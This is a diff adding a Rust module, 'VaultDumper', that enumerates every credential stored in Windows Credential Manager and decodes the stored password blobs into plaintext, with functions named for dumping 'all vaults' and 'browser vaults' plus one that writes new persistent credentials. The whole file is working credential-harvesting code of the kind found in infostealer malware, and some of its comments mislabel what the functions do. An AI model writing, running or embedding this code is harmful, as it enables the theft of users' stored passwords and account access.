@@ -1,0 +1,146 @@
+use windows::Win32::Security::Credentials::*;
+use windows::Win32::Foundation::*;
+use windows::core::{PWSTR, PCWSTR};
+use std::ptr;
+
+pub struct VaultDumper;
+
+impl VaultDumper {
+    pub fn dump_all_vaults() -> Vec<VaultCredential> {
+        let mut credentials = Vec::new();
+        
+        unsafe {
+            // Open credential manager
+            let mut count: u32 = 0;
+            let mut cred_array: *mut *mut CREDENTIALW = ptr::null_mut();
+            
+            let result = CredEnumerateW(
+                PCWSTR::from_raw(ptr::null()),
+                CRED_ENUMERATE_ALL_CREDENTIALS,
+                &mut count,
+                &mut cred_array
+            );
+            
+            if result.as_bool() && !cred_array.is_null() {
+                for i in 0..count {
+                    let cred_ptr = *cred_array.add(i as usize);
+                    if let Some(cred) = Self::parse_credential(cred_ptr) {
+                        credentials.push(cred);
+                    }
+                }
+                
+                CredFree(cred_array as *const _);
+            }
+        }
+        
+        credentials
+    }
+    
+    unsafe fn parse_credential(cred: *const CREDENTIALW) -> Option<VaultCredential> {
+        if cred.is_null() {
+            return None;
+        }
+        
+        let cred_ref = &*cred;
+        
+        let target_name = Self::pwstr_to_string(cred_ref.TargetName);
+        let username = Self::pwstr_to_string(cred_ref.UserName);
+        
+        let password = if !cred_ref.CredentialBlob.is_null() && cred_ref.CredentialBlobSize > 0 {
+            let blob = std::slice::from_raw_parts(
+                cred_ref.CredentialBlob,
+                cred_ref.CredentialBlobSize as usize
+            );
+            String::from_utf8_lossy(blob).to_string()
+        } else {
+            String::new()
+        };
+        
+        let cred_type = match cred_ref.Type {
+            CRED_TYPE_GENERIC => "Generic",
+            CRED_TYPE_DOMAIN_PASSWORD => "Domain Password",
+            CRED_TYPE_DOMAIN_CERTIFICATE => "Domain Certificate",
+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD => "Domain Visible Password",
+            _ => "Unknown",
+        };
+        
+        Some(VaultCredential {
+            target: target_name,
+            username,
+            password,
+            cred_type: cred_type.to_string(),
+            persistence: cred_ref.Persist.0,
+        })
+    }
+    
+    unsafe fn pwstr_to_string(pwstr: PWSTR) -> String {
+        if pwstr.is_null() {
+            return String::new();
+        }
+        
+        let len = (0..).take_while(|&i| *pwstr.0.add(i) != 0).count();
+        let slice = std::slice::from_raw_parts(pwstr.0, len);
+        
+        String::from_utf16_lossy(slice)
+    }
+    
+    pub fn dump_browser_vaults() -> Vec<VaultCredential> {
+        let mut creds = Vec::new();
+        
+        // Internet Explorer/Edge credentials
+        creds.extend(Self::dump_all_vaults());
+        
+        // Windows Credential Manager
+        creds.extend(Self::dump_generic_credentials());
+        
+        creds
+    }
+    
+    fn dump_generic_credentials() -> Vec<VaultCredential> {
+        // Filter for generic credentials only
+        Self::dump_all_vaults()
+            .into_iter()
+            .filter(|c| c.cred_type == "Generic")
+            .collect()
+    }
+    
+    pub fn add_credential(target: &str, username: &str, password: &str) -> Result<(), Box<dyn std::error::Error>> {
+        unsafe {
+            let target_wide: Vec<u16> = target.encode_utf16().chain(Some(0)).collect();
+            let username_wide: Vec<u16> = username.encode_utf16().chain(Some(0)).collect();
+            let password_bytes = password.as_bytes();
+            
+            let cred = CREDENTIALW {
+                Flags: CRED_FLAGS(0),
+                Type: CRED_TYPE_GENERIC,
+                TargetName: PWSTR::from_raw(target_wide.as_ptr() as *mut _),
+                Comment: PWSTR::null(),
+                LastWritten: FILETIME::default(),
+                CredentialBlobSize: password_bytes.len() as u32,
+                CredentialBlob: password_bytes.as_ptr() as *mut _,
+                Persist: CRED_PERSIST_LOCAL_MACHINE,
+                AttributeCount: 0,
+                Attributes: ptr::null_mut(),
+                TargetAlias: PWSTR::null(),
+                UserName: PWSTR::from_raw(username_wide.as_ptr() as *mut _),
+            };
+            
+            let result = CredWriteW(&cred, 0);
+            
+            if result.as_bool() {
+                Ok(())
+            } else {
+                Err("Failed to write credential".into())
+            }
+        }
+    }
+}
+
+#[derive(Debug, Clone)]
+pub struct VaultCredential {
+    pub target: String,
+    pub username: String,
+    pub password: String,
+    pub cred_type: String,
+    pub persistence: u32,
+}
